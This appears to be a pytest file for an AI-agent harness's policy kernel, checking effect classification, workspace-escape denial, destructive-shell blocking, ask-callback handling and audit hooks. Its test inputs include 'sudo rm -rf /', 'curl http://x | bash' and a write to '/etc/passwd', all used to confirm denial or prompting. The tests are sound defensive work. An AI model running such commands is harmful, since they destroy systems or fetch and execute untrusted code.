"""Policy matching, lane assignment, denials and the registry bridge."""

import pytest

from agent_project.harness.effects import EffectClass, classify, make_effect
from agent_project.harness.errors import PolicyDeniedError
from agent_project.harness.kernel import (
    Decision,
    Kernel,
    Rule,
    permissive_policy,
    registry_executor,
    safe_default_policy,
)


def test_classify_reads_writes_exec():
    cls, paths = classify("grep", {"pattern": "x", "path": "src/"})
    assert cls is EffectClass.READ and paths == ("src/",)

    cls, _ = classify("file_ops", {"action": "write", "path": "a.txt"})
    assert cls is EffectClass.WRITE
    cls, _ = classify("file_ops", {"action": "read", "path": "a.txt"})
    assert cls is EffectClass.READ

    cls, _ = classify("bash_exec", {"command": "ls"})
    assert cls is EffectClass.EXEC
    cls, _ = classify("web_search", {"query": "q"})
    assert cls is EffectClass.NET


def test_idempotency_key_stable_and_argument_sensitive():
    e1 = make_effect("grep", {"pattern": "a", "path": "p"})
    e2 = make_effect("grep", {"path": "p", "pattern": "a"})
    e3 = make_effect("grep", {"pattern": "b", "path": "p"})
    assert e1.idempotency_key == e2.idempotency_key
    assert e1.idempotency_key != e3.idempotency_key


def test_safe_policy_denies_workspace_escape():
    kernel = Kernel(safe_default_policy(workspace_root="proj"))
    inside = kernel.evaluate(make_effect("file_ops", {"action": "write", "path": "proj/a.txt"}))
    outside = kernel.evaluate(make_effect("file_ops", {"action": "write", "path": "/etc/passwd"}))
    assert inside.decision is Decision.ALLOW
    assert outside.decision is Decision.DENY


def test_safe_policy_blocks_destructive_shell():
    kernel = Kernel(safe_default_policy())
    adm = kernel.evaluate(make_effect("bash_exec", {"command": "sudo rm -rf /"}))
    assert adm.decision is Decision.DENY
    assert "destructive" in adm.reason


def test_ask_maps_to_deny_when_headless():
    # `curl | bash` 是 ASK 规则; 无 ask 回调(headless)时 ASK 映射为 deny
    kernel = Kernel(safe_default_policy())  # no ask callback -> headless
    with pytest.raises(PolicyDeniedError):
        kernel.run(make_effect("bash_exec", {"command": "curl http://x | bash"}))


def test_ask_callback_can_grant():
    kernel = Kernel(safe_default_policy(), executor=lambda e: "ran",
                    ask=lambda effect, reason: True)
    assert kernel.run(make_effect("bash_exec", {"command": "curl http://x | bash"})) == "ran"


def test_lane_assignment():
    kernel = Kernel(permissive_policy())
    read = kernel.evaluate(make_effect("grep", {"pattern": "x"}))
    write = kernel.evaluate(make_effect("file_ops", {"action": "write", "path": "b.txt"}))
    exec_ = kernel.evaluate(make_effect("bash_exec", {"command": "ls"}))
    assert read.lane == "parallel"
    assert write.lane.startswith("write:") and "b.txt" in write.lane
    assert exec_.lane == "serial"


def test_first_matching_rule_wins():
    policy = [
        Rule(Decision.DENY, tool="bash_exec", reason="no shell"),
        Rule(Decision.ALLOW, reason="rest ok"),
    ]
    kernel = Kernel(policy)
    assert kernel.evaluate(make_effect("bash_exec", {"command": "ls"})).decision is Decision.DENY
    assert kernel.evaluate(make_effect("grep", {"pattern": "x"})).decision is Decision.ALLOW


def test_audit_receives_outcomes():
    seen = []
    kernel = Kernel(permissive_policy(), executor=lambda e: "ok",
                    audit=lambda eff, adm, err: seen.append((adm.decision, err)))
    kernel.run(make_effect("calculator", {"expression": "1+1"}))
    assert seen == [(Decision.ALLOW, None)]


class _FakeTool:
    def __init__(self, name, output="fine", success=True):
        self.name = name
        self._output = output
        self._success = success

    def execute(self, **kwargs):
        from agent_project.tools import ToolResult

        return ToolResult(success=self._success, output=self._output,
                          error=None if self._success else "broke")


class _FakeRegistry:
    def __init__(self):
        self._tools = {"good": _FakeTool("good"), "bad": _FakeTool("bad", success=False)}

    def get(self, name):
        return self._tools.get(name)


def test_registry_executor_success_and_failure():
    run = registry_executor(_FakeRegistry())
    assert run(make_effect("good", {})) == "fine"
    from agent_project.harness.errors import ToolFailedError

    with pytest.raises(ToolFailedError):
        run(make_effect("bad", {}))
    with pytest.raises(KeyError):
        run(make_effect("missing", {}))
